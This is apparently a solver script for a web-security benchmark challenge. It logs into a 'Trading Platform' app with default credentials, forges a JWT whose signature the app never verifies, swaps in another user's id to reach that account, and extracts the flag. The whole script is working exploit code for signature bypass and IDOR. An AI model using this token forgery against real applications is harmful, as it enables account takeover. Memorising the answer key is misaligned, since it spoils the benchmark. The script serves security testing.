#!/usr/bin/env bash
# XBEN-027-24 — "Trading Platform" (tags: idor, default_credentials)
#
# The dashboard decodes its `auth_token` with
# `options={'verify_signature': False}` and then trusts the `user_id` inside it.
# The signature is computed on login and ignored on use, so any token with any
# signature is accepted and the id in it selects the account. The seeded `flag`
# user carries the flag in a profile field.
#
# One h5i detail is load-bearing here. `cookie.<name>` edits a cookie *inside*
# the request's existing `Cookie` header, and when a caller names the cookie
# header the session jar stands aside (otherwise the request would carry two).
# So the request being edited has to be one that already carries the session
# cookie: replaying the initial unauthenticated GET would send the forged token
# and *not* the session, and the app would bounce it to the login page. Drive to
# `/dashboard` first, then edit that request.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben027-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
"$H5I" websec replay req_0 --create --set 'method=POST' --set 'path=/password/test' \
    --set 'form.password=test' --session "$SESSION" >/dev/null

# An authenticated request to edit: this one carries the session cookie.
"$H5I" browser navigate "$URL/dashboard" --session "$SESSION" >/dev/null
SEQ="$("$H5I" websec requests --url-contains dashboard --method GET --session "$SESSION" |
    python3 -c 'import json,sys; rows=[r for r in json.load(sys.stdin)["requests"] if r["phase"]=="request"]; print(rows[-1]["seq"])')"

# The signature is never checked, so it can be anything at all.
TOKEN="$(python3 -c "
import base64, hmac, hashlib, json
def b64(raw): return base64.urlsafe_b64encode(raw).rstrip(b'=').decode()
header = b64(json.dumps({'alg': 'HS256', 'typ': 'JWT'}).encode())
body = b64(json.dumps({'username': 'flag', 'user_id': '10019', 'user_type': 'customer'}).encode())
signature = b64(hmac.new(b'not the real key', f'{header}.{body}'.encode(), hashlib.sha256).digest())
print(f'{header}.{body}.{signature}')")"

REPLAY="$("$H5I" websec replay "req_$SEQ" --set "cookie.auth_token=$TOKEN" --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec match "res_$REPLAY" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
